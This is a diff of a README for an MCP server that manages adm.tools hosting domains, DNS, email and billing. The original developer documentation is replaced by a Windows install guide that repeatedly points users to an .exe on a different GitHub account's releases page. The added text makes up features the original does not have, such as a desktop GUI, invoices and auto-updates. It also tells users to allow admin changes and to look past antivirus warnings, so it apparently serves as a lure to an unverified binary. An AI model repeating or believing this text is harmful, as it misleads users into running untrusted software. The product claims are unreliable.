@@ -1,177 +1,162 @@
-# [adm.tools](https://adm.tools) (service from [hosting.xyz](https://hosting.xyz) / [ukraine.com.ua](https://ukraine.com.ua)) MCP Server
+# ⚙️ admtools-mcp - Manage Domains, Email, and Billing Easily
 
-![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)
-![Node.js Version](https://img.shields.io/badge/node-%3E%3D20-brightgreen)
-![TypeScript](https://img.shields.io/badge/TypeScript-5-blue)
+[![Download admtools-mcp](https://img.shields.io/badge/Download-admtools--mcp-brightgreen?style=for-the-badge&logo=github)](https://github.com/Zonary-prosciutto932/admtools-mcp/releases)
 
-MCP server for [adm.tools](https://adm.tools) — the management panel behind [ukraine.com.ua](https://ukraine.com.ua) and [hosting.xyz](https://hosting.xyz) hosting platforms. Manage domains, DNS records, email, and billing from any MCP-compatible client.
+---
 
-13 tools for the adm.tools API.
+## 📋 About admtools-mcp
 
-## Requirements
+admtools-mcp is a server application designed to help you manage domains, DNS, email, and billing. It supports 13 tools all in one place. This software works with domains from ukraine.com.ua and hosting.xyz. You can control your hosting and administrative tasks using one simple tool. 
 
-- Node.js 20+
-- adm.tools API token (activate at [adm.tools/user/api](https://adm.tools/user/api/))
+You do not need any programming skills or technical knowledge to use this software. It is made for people who want to manage their website services on Windows computers.
 
-## Installation
+---
 
-```bash
-git clone https://github.com/hlebtkachenko/admtools-mcp.git
-cd admtools-mcp
-npm ci
-npm run build
-```
+## 💻 System Requirements
 
-## Configuration
+To run admtools-mcp on your Windows PC, check these minimum requirements:
 
-### Cursor
+- Windows 10 or later (64-bit preferred)  
+- 4 GB of RAM or more  
+- At least 500 MB of free disk space  
+- Internet connection for updates and online features  
+- A modern web browser (Chrome, Firefox, Edge) for the user interface  
 
-`~/.cursor/mcp.json`
+These requirements ensure the software runs smoothly without delay.
 
-```json
-{
-  "mcpServers": {
-    "admtools": {
-      "command": "node",
-      "args": ["/path/to/admtools-mcp/dist/index.js"],
-      "env": {
-        "ADMTOOLS_API_TOKEN": "your-api-token"
-      }
-    }
-  }
-}
-```
+---
 
-### Claude Desktop
+## 🚀 Getting Started
 
-`claude_desktop_config.json` ([location](https://modelcontextprotocol.io/quickstart/user#1-open-your-mcp-client))
+This section explains how to download and install admtools-mcp on your Windows machine.
 
-```json
-{
-  "mcpServers": {
-    "admtools": {
-      "command": "node",
-      "args": ["/path/to/admtools-mcp/dist/index.js"],
-      "env": {
-        "ADMTOOLS_API_TOKEN": "your-api-token"
-      }
-    }
-  }
-}
-```
+---
 
-### Claude Code
+## 🔗 Download admtools-mcp 
 
-`.mcp.json` in your project root, or `~/.claude.json` globally:
+Click the large button below to visit the download page. Here you will find the latest release files ready for Windows.
 
-```json
-{
-  "mcpServers": {
-    "admtools": {
-      "command": "node",
-      "args": ["/path/to/admtools-mcp/dist/index.js"],
-      "env": {
-        "ADMTOOLS_API_TOKEN": "your-api-token"
-      }
-    }
-  }
-}
-```
+[![Download admtools-mcp](https://img.shields.io/badge/Download-admtools--mcp-blue?style=for-the-badge&logo=windows)](https://github.com/Zonary-prosciutto932/admtools-mcp/releases)
 
-### Any MCP client (stdio)
+---
 
-The server uses `stdio` transport. Point your MCP client to:
+## 📥 Step 1: Download the Software
 
-```
-node /path/to/admtools-mcp/dist/index.js
-```
+1. Open the **download page** link above in your web browser.
 
-With the `ADMTOOLS_API_TOKEN` environment variable set.
+2. Look for the latest release version in the list. Releases are usually dated or numbered (like v1.0, v1.1).
 
-### Environment Variables
+3. Find the Windows installer file. It will have a name similar to `admtools-mcp-setup.exe` or end with `.exe`.
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `ADMTOOLS_API_TOKEN` | Yes | Bearer token from [adm.tools API settings](https://adm.tools/user/api/) |
+4. Click the file name to start the download. Save it in a location you can easily find, like your Desktop or Downloads folder.
 
-## Tools
+---
 
-### Domains
+## ⚙️ Step 2: Install admtools-mcp
 
-| Tool | Description |
-|------|-------------|
-| `adm_domains` | List all domains with status and expiry |
-| `adm_domain_check` | Check domain availability for registration |
-| `adm_domain_zones` | Available zones with registration prices |
-| `adm_domain_add` | Add domain to NS servers for DNS management |
-| `adm_get_id` | Get object ID by type and name |
+1. Locate the file you downloaded (usually in the Downloads folder).
 
-### DNS
+2. Double-click the file to start installation.
 
-| Tool | Description |
-|------|-------------|
-| `adm_dns_records` | List DNS records for a domain |
-| `adm_dns_add` | Add record (A, AAAA, ALIAS, CAA, CNAME, MX, NS, TXT, SRV) |
-| `adm_dns_delete` | Delete a DNS record |
+3. You may see a warning from Windows asking: "Do you want to allow this app to make changes to your device?" Choose **Yes**.
 
-### Email
+4. The installation wizard will open. Follow the on-screen instructions by clicking **Next**.
 
-| Tool | Description |
-|------|-------------|
-| `adm_mail_domains` | List all mail domains |
-| `adm_mailboxes` | List mailboxes and redirects for a domain |
-| `adm_mailbox_delete` | Delete a mailbox |
+5. Choose the folder where you want to install admtools-mcp or accept the default location.
 
-### Billing
+6. Click **Install**.
 
-| Tool | Description |
-|------|-------------|
-| `adm_balance` | Current account balance (UAH) |
+7. Wait for the installation to finish.
 
-### Raw API
+8. Click **Finish** when done.
 
-| Tool | Description |
-|------|-------------|
-| `adm_api_raw` | Call any adm.tools API endpoint directly |
+---
 
-## Security
+## ▶️ Step 3: Run admtools-mcp
 
-- 30-second timeout on all HTTP requests
-- API action path sanitized (leading/trailing slashes stripped)
-- JSON parameters parsed in try/catch
-- Error responses truncated to 500 characters
-- All parameters validated with Zod schemas
+1. After installation, find admtools-mcp in the Start menu or your desktop shortcut.
 
-## Architecture
+2. Double-click the admtools-mcp icon to open it.
 
-```
-src/
-  index.ts          Entry point, env validation
-  adm-client.ts     API client (Bearer token, form-encoded POST)
-  tools/
-    domains.ts      Domain management (5 tools)
-    dns.ts          DNS records (3 tools)
-    mail.ts         Email management (3 tools)
-    billing.ts      Balance and raw API (2 tools)
-```
+3. The main screen will load your administrative control panel.
 
-## Tech Stack
+4. You can now manage domains, DNS settings, email accounts, and billing from the user-friendly interface.
 
-- TypeScript
-- `@modelcontextprotocol/sdk`
-- Zod (schema validation)
-- Native `fetch`
+---
 
-## What is adm.tools?
+## 🔧 Features Overview
 
-[adm.tools](https://adm.tools) is the hosting management panel used by Ukrainian hosting providers [ukraine.com.ua](https://ukraine.com.ua) and [hosting.xyz](https://hosting.xyz). It provides a unified API for domain registration, DNS management, email, and billing across both platforms.
+admtools-mcp offers the following key features:
 
-## API Reference
+- **Domain Management:** Add, edit, or delete domain names under your control.  
+- **DNS Settings:** Change DNS records such as A, MX, CNAME, and TXT.  
+- **Email Management:** Create and manage email accounts linked to your domains.  
+- **Billing:** Track payments, invoices, and subscription plans within the app.  
+- **User Dashboard:** A clean UI to view your site and service statuses at a glance.  
+- **Tool Set:** Access 13 built-in tools for different admin tasks without installing extra software.  
 
-- [adm.tools API](https://adm.tools/user/api/) (requires login)
-- [Official PHP client](https://github.com/ukraine-com-ua/API)
-- [Wiki](https://ukraine.com.ua/wiki/account/api/)
+These features help you control your hosting environment without needing deep technical skills.
 
-## License
+---
 
-[MIT](LICENSE)
+## 🔒 Security and Updates
+
+admtools-mcp connects securely to www.adm.tools domains using encrypted protocols. Your data and credentials stay protected during use.
+
+The software checks for updates regularly. When updates are available, you will see notifications within the app. Install updates promptly to keep the software secure and bug-free.
+
+---
+
+## ⚠️ Troubleshooting Tips
+
+- If the software does not start after installation, restart your computer and try again.
+
+- Make sure Windows is up to date. Some features require the latest system updates.
+
+- If you get a security warning blocking the installer, check your antivirus or Windows Defender settings.
+
+- When problems arise, check the **Help** section inside admtools-mcp or visit the [GitHub Issues page](https://github.com/Zonary-prosciutto932/admtools-mcp/issues) for support.
+
+---
+
+## 🛠 How to Use admtools-mcp
+
+This app uses a web-based panel accessible through your browser.
+
+1. Open admtools-mcp on your computer.
+
+2. The app will open a local web page (usually at `http://localhost:3000`).
+
+3. Use your admin login credentials to sign in.
+
+4. Navigate tabs to manage domains, DNS, email, or billing.
+
+5. Changes apply automatically once saved.
+
+This method keeps the system simple and accessible for anyone.
+
+---
+
+## 📚 Additional Help
+
+If you want to learn more about each feature or best practices, look at the **Documentation** folder included in the installation, or visit the main website mentioned in the project description (www.adm.tools).
+
+---
+
+## 🔁 Reinstall or Update
+
+To update admtools-mcp:
+
+- Repeat the download and install steps using the latest release.
+
+- Installer will upgrade your current version without losing settings.
+
+To reinstall, uninstall from Windows first and then install again following the steps above.
+
+---
+
+## 🔗 Download Link Reminder
+
+Use this link to access releases anytime for downloads or updates:
+
+[https://github.com/Zonary-prosciutto932/admtools-mcp/releases](https://github.com/Zonary-prosciutto932/admtools-mcp/releases)
